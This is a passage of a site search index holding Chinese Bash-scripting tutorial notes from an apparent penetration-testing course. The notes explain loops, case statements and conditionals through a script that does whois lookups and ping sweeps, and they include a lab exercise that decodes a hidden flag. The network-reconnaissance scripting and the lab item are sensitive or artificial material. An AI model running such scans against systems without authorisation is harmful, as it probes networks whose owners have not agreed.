Fundamentals</code>\u6a21\u5757\u4e2d\u8f93\u51fa\u7684\u8f93\u51fa\u91cd\u5b9a\u5411\u3002\u7136\u800c\uff0c\u91cd\u5b9a\u5411\u7684\u95ee\u9898\u662f\u6211\u4eec\u6ca1\u6709\u4ece\u76f8\u5e94\u7684\u547d\u4ee4\u4e2d\u83b7\u5f97\u4efb\u4f55\u8f93\u51fa\u3002\u5b83\u5c06\u88ab\u91cd\u5b9a\u5411\u5230\u9002\u5f53\u7684\u6587\u4ef6\u3002\u5982\u679c\u6211\u4eec\u7684\u811a\u672c\u4ee5\u540e\u53d8\u5f97\u66f4\u590d\u6742\uff0c\u5b83\u4eec\u53ef\u80fd\u9700\u8981\u66f4\u591a\u7684\u65f6\u95f4\uff0c\u800c\u4e0d\u4ec5\u4ec5\u662f\u51e0\u79d2\u949f\u3002\u4e3a\u4e86\u907f\u514d\u65e0\u6240\u4e8b\u4e8b\u5730\u7b49\u5f85\u811a\u672c\u7684\u7ed3\u679c\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528tee\u5b9e\u7528\u7a0b\u5e8f\u3002\u5b83\u786e\u4fdd\u6211\u4eec\u7acb\u5373\u770b\u5230\u6211\u4eec\u5f97\u5230\u7684\u7ed3\u679c\uff0c\u5e76\u5c06\u5b83\u4eec\u5b58\u50a8\u5728\u76f8\u5e94\u7684\u6587\u4ef6\u4e2d\u3002\u5728\u6211\u4eec\u7684<code>CIDR.sh</code>\u811a\u672c\u4e2d\uff0c\u6211\u4eec\u4ee5\u4e0d\u540c\u7684\u65b9\u5f0f\u4e24\u6b21\u4f7f\u7528\u4e86\u8fd9\u4e2a\u5b9e\u7528\u7a0b\u5e8f\u3002</p>"},{"location":"Linux/Bash%20%E8%84%9A%E6%9C%AC%E6%8E%A7%E5%88%B6/#cidrsh_1","title":"CIDR.sh","text":"<pre><code>&lt;SNIP&gt;\n\n# Identify Network range for the specified IP address(es)\nfunction network_range {\n    for ip in $ipaddr\n    do\n        netrange=$(whois $ip | grep \"NetRange\\|CIDR\" | tee -a CIDR.txt)\n        cidr=$(whois $ip | grep \"CIDR\" | awk '{print $2}')\n        cidr_ips=$(prips $cidr)\n        echo -e \"\\nNetRange for $ip:\"\n        echo -e \"$netrange\"\n    done\n}\n\n&lt;SNIP&gt;\n\n# Identify IP address of the specified domain\nhosts=$(host $domain | grep \"has address\" | cut -d\" \" -f4 | tee discovered_hosts.txt)\n\n&lt;SNIP&gt;\n</code></pre> <p>\u4f7f\u7528\u65f6<code>tee</code>\uff0c\u6211\u4eec\u5c06\u63a5\u6536\u5230\u7684\u8f93\u51fa\u4f20\u8f93\u5e76\u4f7f\u7528\u7ba1\u9053\uff08<code>|</code>\uff09\u5c06\u5176\u8f6c\u53d1\u5230<code>tee</code>.\u00a0\u201c\u00a0<code>-a</code>/\u00a0<code>--append</code>\u201d\u53c2\u6570\u786e\u4fdd\u6307\u5b9a\u7684\u6587\u4ef6\u4e0d\u88ab\u8986\u76d6\uff0c\u800c\u662f\u7528\u65b0\u7684\u7ed3\u679c\u8fdb\u884c\u8865\u5145\u3002\u540c\u65f6\uff0c\u5b83\u5411\u6211\u4eec\u5c55\u793a\u4e86\u7ed3\u679c\u4ee5\u53ca\u5982\u4f55\u5728\u6587\u4ef6\u4e2d\u627e\u5230\u5b83\u4eec\u3002</p> <pre><code>darkinga@htb[/htb]$ cat discovered_hosts.txt CIDR.txt\n\n165.22.119.202\nNetRange:       165.22.0.0 - 165.22.255.255\nCIDR:           165.22.0.0/16\n</code></pre>"},{"location":"Linux/Bash%20%E8%84%9A%E6%9C%AC%E6%8E%A7%E5%88%B6/#flow-control-loops","title":"Flow Control - \u5faa\u73af(Loops)","text":"<p>\u63a7\u5236\u6211\u4eec\u7684\u811a\u672c\u6d41\u7a0b\u662f\u5fc5\u4e0d\u53ef\u5c11\u7684\u3002\u6211\u4eec\u5df2\u7ecf\u4e86\u89e3\u4e86<code>if-else</code>\u6761\u4ef6\uff0c\u8fd9\u4e5f\u662f\u6d41\u91cf\u63a7\u5236\u7684\u4e00\u90e8\u5206\u3002\u6bd5\u7adf\uff0c\u6211\u4eec\u5e0c\u671b\u6211\u4eec\u7684\u811a\u672c\u80fd\u591f\u5feb\u901f\u9ad8\u6548\u5730\u5de5\u4f5c\uff0c\u4e3a\u6b64\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u5176\u4ed6\u7ec4\u4ef6\u6765\u63d0\u9ad8\u6548\u7387\u5e76\u5141\u8bb8\u65e0\u9519\u8bef\u5904\u7406\u3002\u6bcf\u4e2a\u63a7\u5236\u7ed3\u6784\u90fd\u662f a<code>branch</code>\u6216 a\u00a0<code>loop</code>\u3002\u5e03\u5c14\u503c\u7684\u903b\u8f91\u8868\u8fbe\u5f0f\u901a\u5e38\u63a7\u5236\u63a7\u5236\u7ed3\u6784\u7684\u6267\u884c\u3002\u8fd9\u4e9b\u63a7\u5236\u7ed3\u6784\u5305\u62ec\uff1a</p> <ul> <li> <p>\u5206\u652f\u673a\u6784\uff1a</p> <ul> <li><code>If-Else</code>\u6761\u4ef6</li> <li><code>Case</code>\u58f0\u660e</li> <li> <p>\u5faa\u73af\uff1a</p> </li> <li> <p><code>For</code>\u5faa\u73af</p> </li> <li><code>While</code>\u5faa\u73af</li> <li><code>Until</code>\u5faa\u73af</li> </ul> </li> </ul>"},{"location":"Linux/Bash%20%E8%84%9A%E6%9C%AC%E6%8E%A7%E5%88%B6/#for","title":"For \u5faa\u73af","text":"<p>\u8ba9\u6211\u4eec\u4ece<code>For</code>\u5faa\u73af\u5f00\u59cb\u3002\u5faa\u73af\u5728<code>For</code>\u6bcf\u6b21\u4f20\u9012\u65f6\u6267\u884c\u4e00\u4e2a\u53c2\u6570\uff0cshell \u4ece\u5217\u8868\u4e2d\u83b7\u53d6\uff0c\u4ece\u589e\u91cf\u8ba1\u7b97\uff0c\u6216\u8005\u4ece\u53e6\u4e00\u4e2a\u6570\u636e\u6e90\u83b7\u53d6\u3002\u53ea\u8981\u627e\u5230\u76f8\u5e94\u7684\u6570\u636e\uff0cfor \u5faa\u73af\u5c31\u4f1a\u8fd0\u884c\u3002\u8fd9\u79cd\u7c7b\u578b\u7684\u5faa\u73af\u53ef\u4ee5\u4ee5\u4e0d\u540c\u7684\u65b9\u5f0f\u6784\u5efa\u548c\u5b9a\u4e49\u3002\u4f8b\u5982\uff0c\u5f53\u6211\u4eec\u9700\u8981\u5904\u7406\u6570\u7ec4\u4e2d\u7684\u8bb8\u591a\u4e0d\u540c\u503c\u65f6\uff0c\u901a\u5e38\u4f1a\u4f7f\u7528 for \u5faa\u73af\u3002\u8fd9\u53ef\u7528\u4e8e\u626b\u63cf\u4e0d\u540c\u7684\u4e3b\u673a\u6216\u7aef\u53e3\u3002\u6211\u4eec\u8fd8\u53ef\u4ee5\u4f7f\u7528\u5b83\u5bf9\u5df2\u77e5\u7aef\u53e3\u53ca\u5176\u670d\u52a1\u6267\u884c\u7279\u5b9a\u547d\u4ee4\uff0c\u4ee5\u52a0\u5feb\u6211\u4eec\u7684\u679a\u4e3e\u8fc7\u7a0b\u3002\u5176\u8bed\u6cd5\u5982\u4e0b\uff1a</p>"},{"location":"Linux/Bash%20%E8%84%9A%E6%9C%AC%E6%8E%A7%E5%88%B6/#-","title":"\u8bed\u6cd5 - \u793a\u4f8b","text":"<pre><code>for $variable in 1 2 3 4\ndo\n    echo $variable\ndone\n</code></pre> <pre><code>for $variable in file1 file2 file3\ndo\n    echo $variable\ndone\n</code></pre> <pre><code>for ip in \"10.10.10.170 10.10.10.174 10.10.10.175\"\ndo\n    ping -c 1 $ip\ndone\n</code></pre> <p>\u5f53\u7136\uff0c\u6211\u4eec\u4e5f\u53ef\u4ee5\u5c06\u8fd9\u4e9b\u547d\u4ee4\u5199\u5728\u4e00\u884c\u4e2d\u3002\u8fd9\u6837\u7684\u547d\u4ee4\u770b\u8d77\u6765\u50cf\u8fd9\u6837\uff1a</p> <pre><code>$ for ip in 10.10.10.170 10.10.10.174;do ping -c 1 $ip;done\n\nPING 10.10.10.170 (10.10.10.170): 56 data bytes\n64 bytes from 10.10.10.170: icmp_seq=0 ttl=63 time=42.106 ms\n\n--- 10.10.10.170 ping statistics ---\n1 packets transmitted, 1 packets received, 0.0% packet loss\nround-trip min/avg/max/stddev = 42.106/42.106/42.106/0.000 ms\nPING 10.10.10.174 (10.10.10.174): 56 data bytes\n64 bytes from 10.10.10.174: icmp_seq=0 ttl=63 time=45.700 ms\n\n--- 10.10.10.174 ping statistics ---\n1 packets transmitted, 1 packets received, 0.0% packet loss\nround-trip min/avg/max/stddev = 45.700/45.700/45.700/0.000 ms\n</code></pre> <p>\u8ba9\u6211\u4eec\u518d\u770b\u770b\u6211\u4eec\u7684<code>CIDR.sh</code>\u811a\u672c\u3002\u6211\u4eec\u5728\u811a\u672c\u4e2d\u6dfb\u52a0\u4e86\u51e0\u4e2a for \u5faa\u73af\uff0c\u4f46\u8ba9\u6211\u4eec\u575a\u6301\u8fd9\u4e2a\u5c0f\u4ee3\u7801\u90e8\u5206\u3002</p>"},{"location":"Linux/Bash%20%E8%84%9A%E6%9C%AC%E6%8E%A7%E5%88%B6/#cidrsh_2","title":"CIDR.sh","text":"<pre><code>&lt;SNIP&gt;\n\n# Identify Network range for the specified IP address(es)\nfunction network_range {\n    for ip in $ipaddr\n    do\n        netrange=$(whois $ip | grep \"NetRange\\|CIDR\" | tee -a CIDR.txt)\n        cidr=$(whois $ip | grep \"CIDR\" | awk '{print $2}')\n        cidr_ips=$(prips $cidr)\n        echo -e \"\\nNetRange for $ip:\"\n        echo -e \"$netrange\"\n    done\n}\n\n&lt;SNIP&gt;\n</code></pre> <p>\u4e0e\u524d\u9762\u7684\u793a\u4f8b\u4e00\u6837\uff0c\u5bf9\u4e8e\u6570\u7ec4 \"\u00a0<code>ipaddr</code>\" \u4e2d\u7684\u6bcf\u4e2a IP \u5730\u5740\uff0c\u6211\u4eec\u53d1\u51fa\u4e00\u4e2a \"\u00a0<code>whois</code>\" \u8bf7\u6c42\uff0c\u5176\u8f93\u51fa\u88ab\u8fc7\u6ee4\u4e3a \"\u00a0<code>NetRange</code>\" \u548c \"\u00a0<code>CIDR</code>\u3002\"\u00a0\u8fd9\u6709\u52a9\u4e8e\u6211\u4eec\u786e\u5b9a\u76ee\u6807\u6240\u5728\u7684\u5730\u5740\u8303\u56f4\u3002\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u8fd9\u4e9b\u4fe1\u606f\u5728\u6e17\u900f\u6d4b\u8bd5\u671f\u95f4\u641c\u7d22\u5176\u4ed6\u4e3b\u673a\uff0c<code>if approved by the client</code>.\u00a0\u6211\u4eec\u6536\u5230\u7684\u7ed3\u679c\u4f1a\u76f8\u5e94\u663e\u793a\u5e76\u5b58\u50a8\u5728\u6587\u4ef6\u201c\u00a0<code>CIDR.txt</code>.\u201d\u4e2d\u3002</p>"},{"location":"Linux/Bash%20%E8%84%9A%E6%9C%AC%E6%8E%A7%E5%88%B6/#while","title":"While \u5faa\u73af","text":"<p>\u5faa\u73af\u5728<code>while</code>\u6982\u5ff5\u4e0a\u5f88\u7b80\u5355\uff0c\u9075\u5faa\u4ee5\u4e0b\u539f\u5219\uff1a</p> <ul> <li>\u53ea\u8981\u6ee1\u8db3\u6761\u4ef6\uff08<code>true</code>\uff09\uff0c\u5c31\u4f1a\u6267\u884c\u8bed\u53e5\u3002</li> </ul> <p>\u6211\u4eec\u8fd8\u53ef\u4ee5\u7ec4\u5408\u5faa\u73af\u5e76\u5c06\u5b83\u4eec\u7684\u6267\u884c\u4e0e\u4e0d\u540c\u7684\u503c\u5408\u5e76\u3002\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u591a\u4e2a\u5faa\u73af\u76f8\u4e92\u8fc7\u5ea6\u7ec4\u5408\u4f1a\u4f7f\u4ee3\u7801\u975e\u5e38\u4e0d\u6e05\u695a\uff0c\u5e76\u5bfc\u81f4\u96be\u4ee5\u67e5\u627e\u548c\u8ddf\u8e2a\u7684\u9519\u8bef\u3002\u8fd9\u6837\u7684\u7ec4\u5408\u53ef\u4ee5\u770b\u8d77\u6765\u50cf\u6211\u4eec\u7684<code>CIDR.sh</code>\u811a\u672c\u3002</p>"},{"location":"Linux/Bash%20%E8%84%9A%E6%9C%AC%E6%8E%A7%E5%88%B6/#cidrsh_3","title":"CIDR.sh","text":"<pre><code>&lt;SNIP&gt;\n        stat=1\n        while [ $stat -eq 1 ]\n        do\n            ping -c 2 $host &gt; /dev/null 2&gt;&amp;1\n            if [ $? -eq 0 ]\n            then\n                echo \"$host is up.\"\n                ((stat--))\n                ((hosts_up++))\n                ((hosts_total++))\n            else\n                echo \"$host is down.\"\n                ((stat--))\n                ((hosts_total++))\n            fi\n        done\n&lt;SNIP&gt;\n</code></pre> <p><code>while</code>\u5faa\u73af\u4e5f\u9002\u7528\u4e8e<code>if-else</code>.\u00a0\u5f53\u4e00\u4e2awhile\u5faa\u73af\u5fc5\u987b\u505c\u6b62\u6267\u884c\u5b83\u5305\u542b\u7684\u547d\u4ee4\u65f6\uff0c\u5b83\u9700\u8981\u67d0\u79cd\u8ba1\u6570\u5668\u6765\u5b9a\u4f4d\u81ea\u5df1\u3002\u5426\u5219\uff0c\u8fd9\u4f1a\u5bfc\u81f4\u65e0\u9650\u5faa\u73af\u3002\u8fd9\u6837\u7684\u8ba1\u6570\u5668\u53ef\u4ee5\u662f\u6211\u4eec\u7528\u7279\u5b9a\u503c\u6216\u5e03\u5c14\u503c\u58f0\u660e\u7684\u53d8\u91cf\u3002<code>While</code>\u5f53\u5e03\u5c14\u503c\u4e3a\u201c\u00a0<code>True</code>\u201d\u65f6\u5faa\u73af\u8fd0\u884c\u3002\u9664\u4e86\u8ba1\u6570\u5668\u4e4b\u5916\uff0c\u6211\u4eec\u8fd8\u53ef\u4ee5\u4f7f\u7528\u547d\u4ee4\u201c \u201d\u00a0<code>break</code>\uff0c\u5b83\u4f1a\u5728\u5230\u8fbe\u8be5\u547d\u4ee4\u65f6\u4e2d\u65ad\u5faa\u73af\uff0c\u5982\u4e0b\u4f8b\u6240\u793a\uff1a</p>"},{"location":"Linux/Bash%20%E8%84%9A%E6%9C%AC%E6%8E%A7%E5%88%B6/#whilebreakersh","title":"WhileBreaker.sh","text":"<pre><code>#!/bin/bash\n\ncounter=0\n\nwhile [ $counter -lt 10 ]\ndo\n  # Increase $counter by 1\n  ((counter++))\n  echo \"Counter: $counter\"\n\n  if [ $counter == 2 ]\n  then\n    continue\n  elif [ $counter == 4 ]\n  then\n    break\n  fi\ndone\n</code></pre>"},{"location":"Linux/Bash%20%E8%84%9A%E6%9C%AC%E6%8E%A7%E5%88%B6/#whilebreakersh_1","title":"WhileBreaker.sh","text":"<pre><code>darkinga@htb[/htb]$ ./WhileBreaker.sh\n\nCounter: 1\nCounter: 2\nCounter: 3\nCounter: 4\n</code></pre>"},{"location":"Linux/Bash%20%E8%84%9A%E6%9C%AC%E6%8E%A7%E5%88%B6/#until-loops","title":"Until Loops","text":"<p>\u8fd8\u6709<code>until</code>\u5faa\u73af\uff0c\u6bd4\u8f83\u5c11\u89c1\u3002\u5c3d\u7ba1\u5982\u6b64\uff0c<code>until</code>\u5faa\u73af\u7684\u5de5\u4f5c\u65b9\u5f0f\u4e0e\u5faa\u73af\u5b8c\u5168\u76f8\u540c<code>while</code>\uff0c\u4f46\u4e0d\u540c\u4e4b\u5904\u5728\u4e8e\uff1a</p> <ul> <li><code>until</code>\u53ea\u8981\u7279\u5b9a\u6761\u4ef6\u4e3a \uff0c\u5c31\u4f1a\u6267\u884c\u5faa\u73af\u5185\u7684\u4ee3\u7801<code>false</code>\u3002</li> </ul> <p>\u53e6\u4e00\u79cd\u65b9\u6cd5\u662f\u8ba9\u5faa\u73af\u8fd0\u884c\u76f4\u5230\u8fbe\u5230\u6240\u9700\u7684\u503c\u3002\"\u00a0<code>until</code>\" \u5faa\u73af\u975e\u5e38\u9002\u5408\u8fd9\u79cd\u60c5\u51b5\u3002\u8fd9\u79cd\u5faa\u73af\u7684\u5de5\u4f5c\u65b9\u5f0f\u4e0e \"\u00a0<code>while</code>\" \u5faa\u73af\u7c7b\u4f3c\uff0c\u4f46\u5982\u524d\u6240\u8ff0\uff0c\u4e0d\u540c\u4e4b\u5904\u5728\u4e8e\u5b83\u4e00\u76f4\u8fd0\u884c\u5230\u5e03\u5c14\u503c\u4e3a \"\u00a0<code>False</code>\u3002\"</p>"},{"location":"Linux/Bash%20%E8%84%9A%E6%9C%AC%E6%8E%A7%E5%88%B6/#untilsh","title":"Until.sh","text":"<pre><code>#!/bin/bash\n\ncounter=0\n\nuntil [ $counter -eq 10 ]\ndo\n  # Increase $counter by 1\n  ((counter++))\n  echo \"Counter: $counter\"\ndone\n</code></pre>"},{"location":"Linux/Bash%20%E8%84%9A%E6%9C%AC%E6%8E%A7%E5%88%B6/#untilsh_1","title":"Until.sh","text":"<pre><code>$ ./Until.sh\n\nCounter: 1\nCounter: 2\nCounter: 3\nCounter: 4\nCounter: 5\nCounter: 6\nCounter: 7\nCounter: 8\nCounter: 9\nCounter: 10\n</code></pre>"},{"location":"Linux/Bash%20%E8%84%9A%E6%9C%AC%E6%8E%A7%E5%88%B6/#_4","title":"\u7ec3\u4e60\u811a\u672c","text":"<pre><code>#!/bin/bash\n\n# Decrypt function\nfunction decrypt {\n    MzSaas7k=$(echo $hash | sed 's/988sn1/83unasa/g')\n    Mzns7293sk=$(echo $MzSaas7k | sed 's/4d298d/9999/g')\n    MzSaas7k=$(echo $Mzns7293sk | sed 's/3i8dqos82/873h4d/g')\n    Mzns7293sk=$(echo $MzSaas7k | sed 's/4n9Ls/20X/g')\n    MzSaas7k=$(echo $Mzns7293sk | sed 's/912oijs01/i7gg/g')\n    Mzns7293sk=$(echo $MzSaas7k | sed 's/k32jx0aa/n391s/g')\n    MzSaas7k=$(echo $Mzns7293sk | sed 's/nI72n/YzF1/g')\n    Mzns7293sk=$(echo $MzSaas7k | sed 's/82ns71n/2d49/g')\n    MzSaas7k=$(echo $Mzns7293sk | sed 's/JGcms1a/zIm12/g')\n    Mzns7293sk=$(echo $MzSaas7k | sed 's/MS9/4SIs/g')\n    MzSaas7k=$(echo $Mzns7293sk | sed 's/Ymxj00Ims/Uso18/g')\n    Mzns7293sk=$(echo $MzSaas7k | sed 's/sSi8Lm/Mit/g')\n    MzSaas7k=$(echo $Mzns7293sk | sed 's/9su2n/43n92ka/g')\n    Mzns7293sk=$(echo $MzSaas7k | sed 's/ggf3iunds/dn3i8/g')\n    MzSaas7k=$(echo $Mzns7293sk | sed 's/uBz/TT0K/g')\n\n    flag=$(echo $MzSaas7k | base64 -d | openssl enc -aes-128-cbc -a -d -salt -pass pass:$salt)\n}\n\n# Variables\nvar=\"9M\"\nsalt=\"\"\nhash=\"VTJGc2RHVmtYMTl2ZnYyNTdUeERVRnBtQWVGNmFWWVUySG1wTXNmRi9rQT0K\"\n\n# Base64 Encoding Example:\n#        $ echo \"Some Text\" | base64\n\n# &lt;- For-Loop here\n\n# Check if $salt is empty\nif [[ ! -z \"$salt\" ]]\nthen\n    decrypt\n    echo $flag\nelse\n    exit 1\nfi\n</code></pre> <p>\u521b\u5efa\u4e00\u4e2a\u201cfor\u201d\u5faa\u73af\uff0c\u5728\u201cbase64\u201d\u4e2d\u5bf9\u53d8\u91cf\u201cvar\u201d\u8fdb\u884c 28 \u6b21\u7f16\u7801\u3002\u7b2c 28 \u4e2a\u54c8\u5e0c\u4e2d\u7684\u5b57\u7b26\u6570\u662f\u5fc5\u987b\u5206\u914d\u7ed9\u201csalt\u201d\u53d8\u91cf\u7684\u503c\u3002</p>"},{"location":"Linux/Bash%20%E8%84%9A%E6%9C%AC%E6%8E%A7%E5%88%B6/#flow-control-branches","title":"Flow Control - Branches(\u5206\u652f)","text":"<p>\u6b63\u5982\u6211\u4eec\u5df2\u7ecf\u770b\u5230\u7684\uff0c\u6d41\u63a7\u5236\u4e2d\u7684\u5206\u652f\u5305\u62ec<code>if-else</code>\u548c<code>case</code>\u8bed\u53e5\u3002\u6211\u4eec\u5df2\u7ecf\u8be6\u7ec6\u8ba8\u8bba\u4e86\u8fd9\u4e9b<code>if-else</code>\u8bed\u53e5\uff0c\u5e76\u4e14\u77e5\u9053\u5b83\u662f\u5982\u4f55\u5de5\u4f5c\u7684\u3002\u73b0\u5728\u6211\u4eec\u5c06\u4ed4\u7ec6\u7814\u7a76\u6848\u4f8b\u9648\u8ff0\u3002</p>"},{"location":"Linux/Bash%20%E8%84%9A%E6%9C%AC%E6%8E%A7%E5%88%B6/#_5","title":"\u6848\u4f8b\u9648\u8ff0","text":"<p><code>Case</code>\u8bed\u53e5\u5728\u5176\u4ed6\u8bed\u8a00\u4e2d\u4e5f\u79f0\u4e3a<code>switch-case</code>\u8bed\u53e5\uff0c\u4f8b\u5982 C/C++ \u548c C#\u3002<code>if-else</code>\u548c<code>switch-case</code>\u4e4b\u95f4\u7684\u4e3b\u8981\u533a\u522b\u5728\u4e8e<code>if-else</code>\u6784\u9020\u5141\u8bb8\u6211\u4eec\u68c0\u67e5\u4efb\u4f55\u5e03\u5c14\u8868\u8fbe\u5f0f\uff0c\u800c<code>switch-case</code>\u59cb\u7ec8\u53ea\u5c06\u53d8\u91cf\u4e0e\u786e\u5207\u503c\u8fdb\u884c\u6bd4\u8f83\u3002\u56e0\u6b64\uff0c\u4e0d\u5141\u8bb8\u4f7f\u7528\u4e0e <code>if-else</code> \u76f8\u540c\u7684\u6761\u4ef6\uff0c\u4f8b\u5982\u201c\u5927\u4e8e\u201d\u00a0\u3002<code>switch-case</code>\u8bed\u53e5\u7684\u8bed\u6cd5\u5982\u4e0b\u6240\u793a\uff1a</p>"},{"location":"Linux/Bash%20%E8%84%9A%E6%9C%AC%E6%8E%A7%E5%88%B6/#-switch-case","title":"\u8bed\u6cd5 - Switch-Case","text":"<pre><code>case &lt;expression&gt; in\n    pattern_1 ) statements ;;\n    pattern_2 ) statements ;;\n    pattern_3 ) statements ;;\nesac\n</code></pre> <p>switch-case \u7684\u5b9a\u4e49\u4ee5 <code>case</code> \u5f00\u5934\uff0c\u540e\u8ddf\u4f5c\u4e3a\u8868\u8fbe\u5f0f\u7684\u53d8\u91cf\u6216\u503c\uff0c\u7136\u540e\u5728\u6a21\u5f0f\u4e2d\u8fdb\u884c\u6bd4\u8f83\u3002\u5982\u679c\u53d8\u91cf\u6216\u503c\u4e0e\u8868\u8fbe\u5f0f\u5339\u914d\uff0c\u5219\u8bed\u53e5\u5728\u62ec\u53f7\u540e\u6267\u884c\u5e76\u4ee5\u53cc\u5206\u53f7 (\u00a0<code>;;</code>) \u7ed3\u675f\u3002</p> <p>\u5728\u6211\u4eec\u7684<code>CIDR.sh</code>\u811a\u672c\u4e2d\uff0c\u6211\u4eec\u4f7f\u7528\u4e86\u8fd9\u6837\u7684<code>case</code>\u8bed\u53e5\u3002\u5728\u8fd9\u91cc\uff0c\u6211\u4eec\u5b9a\u4e49\u4e86\u5206\u914d\u7ed9\u811a\u672c\u7684\u56db\u4e2a\u4e0d\u540c\u9009\u9879\uff0c\u5728\u6211\u4eec\u505a\u51fa\u51b3\u5b9a\u540e\u5b83\u5e94\u8be5\u5982\u4f55\u8fdb\u884c\u3002</p>"},{"location":"Linux/Bash%20%E8%84%9A%E6%9C%AC%E6%8E%A7%E5%88%B6/#cidrsh_4","title":"CIDR.sh","text":"<pre><code>&lt;SNIP&gt;\n# Available options\necho -e \"Additional options available:\"\necho -e \"\\t1) Identify the corresponding network range of target domain.\"\necho -e \"\\t2) Ping discovered hosts.\"\necho -e \"\\t3) All checks.\"\necho -e \"\\t*) Exit.\\n\"\n\nread -p \"Select your option: \" opt\n\ncase $opt in\n    \"1\") network_range ;;\n    \"2\") ping_host ;;\n    \"3\") network_range &amp;&amp; ping_host ;;\n    \"*\") exit 0 ;;\nesac\n&lt;SNIP&gt;\n</code></pre> <p>\u4f7f\u7528\u524d\u4e24\u4e2a\u9009\u9879\uff0c\u6b64\u811a\u672c\u6267\u884c\u6211\u4eec\u4e4b\u524d\u5b9a\u4e49\u7684\u4e0d\u540c\u529f\u80fd\u3002\u4f7f\u7528\u7b2c\u4e09\u4e2a\u9009\u9879\uff0c\u4e24\u4e2a\u51fd\u6570\u90fd\u88ab\u6267\u884c\uff0c\u800c\u4f7f\u7528\u4efb\u4f55\u5176\u4ed6\u9009\u9879\uff0c\u811a\u672c\u5c06\u88ab\u7ec8\u6b62\u3002</p>"},{"location":"Linux/Bash%20%E8%84%9A%E6%9C%AC%E6%8E%A7%E5%88%B6/#bash","title":"bash","text":""},{"location":"Linux/Bash%E8%84%9A%E6%9C%AC%E5%B7%A5%E4%BD%9C%E7%BB%84%E4%BB%B6/","title":"Bash\u811a\u672c\u5de5\u4f5c\u7ec4\u4ef6","text":""},{"location":"Linux/Bash%E8%84%9A%E6%9C%AC%E5%B7%A5%E4%BD%9C%E7%BB%84%E4%BB%B6/#_1","title":"\u6761\u4ef6\u6267\u884c","text":"<p>\u6761\u4ef6\u6267\u884c\u5141\u8bb8\u6211\u4eec\u901a\u8fc7\u8fbe\u5230\u4e0d\u540c\u7684\u6761\u4ef6\u6765\u63a7\u5236\u811a\u672c\u7684\u6d41\u7a0b\u3002\u6b64\u529f\u80fd\u662f\u5fc5\u4e0d\u53ef\u5c11\u7684\u7ec4\u4ef6\u4e4b\u4e00\u3002\u5426\u5219\uff0c\u6211\u4eec\u53ea\u80fd\u6267\u884c\u4e00\u4e2a\u63a5\u4e00\u4e2a\u7684\u547d\u4ee4\u3002</p> <p>\u5728\u5b9a\u4e49\u5404\u79cd\u6761\u4ef6\u65f6\uff0c\u6211\u4eec\u6307\u5b9a\u5e94\u9488\u5bf9\u7279\u5b9a\u503c\u6267\u884c\u54ea\u4e9b\u51fd\u6570\u6216\u4ee3\u7801\u6bb5\u3002\u5982\u679c\u6211\u4eec\u8fbe\u5230\u7279\u5b9a\u6761\u4ef6\uff0c\u5219\u4ec5\u6267\u884c\u8be5\u6761\u4ef6\u7684\u4ee3\u7801\uff0c\u800c\u8df3\u8fc7\u5176\u4ed6\u4ee3\u7801\u3002\u4e00\u65e6\u4ee3\u7801\u90e8\u5206\u5b8c\u6210\uff0c\u4ee5\u4e0b\u547d\u4ee4\u5c06\u5728\u6761\u4ef6\u6267\u884c\u4e4b\u5916\u6267\u884c\u3002\u8ba9\u6211\u4eec\u518d\u770b\u4e00\u904d\u811a\u672c\u7684\u7b2c\u4e00\u90e8\u5206\u5e76\u5206\u6790\u4e00\u4e0b\u3002</p>"},{"location":"Linux/Bash%E8%84%9A%E6%9C%AC%E5%B7%A5%E4%BD%9C%E7%BB%84%E4%BB%B6/#scriptsh","title":"Script.sh","text":"<pre><code>#!/bin/bash\n\n# Check for given argument\nif [ $# -eq 0 ]\nthen\n    echo -e \"You need to specify the target domain.\\n\"\n    echo -e \"Usage:\"\n    echo -e \"\\t$0 &lt;domain&gt;\"\n    exit 1\nelse\n    domain=$1\nfi\n\n&lt;SNIP&gt;\n</code></pre> <p>\u603b\u4e4b\uff0c\u6b64\u4ee3\u7801\u9002\u7528\u4e8e\u4ee5\u4e0b\u7ec4\u4ef6\uff1a - <code>#!/bin/bash</code>  -  Shebang. - <code>if-else-fi</code>  -  Conditional execution - <code>echo</code>  -  \u6253\u5370\u6307\u5b9a\u8f93\u51fa - <code>$#</code>\u00a0/\u00a0<code>$0</code>\u00a0/\u00a0<code>$1</code>  -  \u7279\u6b8a\u53d8\u91cf - <code>domain</code>  -  \u53d8\u91cf</p> <p>\u6761\u4ef6\u6267\u884c\u7684\u6761\u4ef6\u53ef\u4ee5\u4f7f\u7528\u53d8\u91cf(<code>$#</code>,<code>$0</code>,<code>$1</code>,<code>domain</code>)\u3001\u503c(values)(<code>0</code>)\u548c\u5b57\u7b26\u4e32\u5b9a\u4e49\uff0c\u63a5\u4e0b\u6765\u7684\u793a\u4f8b\u4e2d\u770b\u5230\u3002\u8fd9\u4e9b\u503c\u4e0e\u6211\u4eec\u5c06\u5728\u4e0b\u4e00\u8282\u4e2d\u770b\u5230\u7684 <code>comparison operators</code>(\u6bd4\u8f83\u8fd0\u7b97\u7b26) (<code>-eq</code>) \u8fdb\u884c\u6bd4\u8f83\u3002</p>"},{"location":"Linux/Bash%E8%84%9A%E6%9C%AC%E5%B7%A5%E4%BD%9C%E7%BB%84%E4%BB%B6/#shebang","title":"shebang","text":"<p>shebang \u884c\u59cb\u7ec8\u4f4d\u4e8e\u6bcf\u4e2a\u811a\u672c\u7684\u9876\u90e8\uff0c\u5e76\u4e14\u59cb\u7ec8\u4ee5\u201c\u00a0<code>#!</code>\u201d\u5f00\u5934\u3002\u6b64\u884c\u5305\u542b<code>/bin/bash</code>\u6267\u884c\u811a\u672c\u7684\u6307\u5b9a\u89e3\u91ca\u5668 ( ) \u7684\u8def\u5f84\u3002\u6211\u4eec\u8fd8\u53ef\u4ee5\u4f7f\u7528 Shebang \u5b9a\u4e49\u5176\u4ed6\u89e3\u91ca\u5668\uff0c\u5982 Python\u3001Perl \u7b49\u3002</p> <pre><code>#!/usr/bin/env python\n</code></pre> <pre><code>#!/usr/bin/env 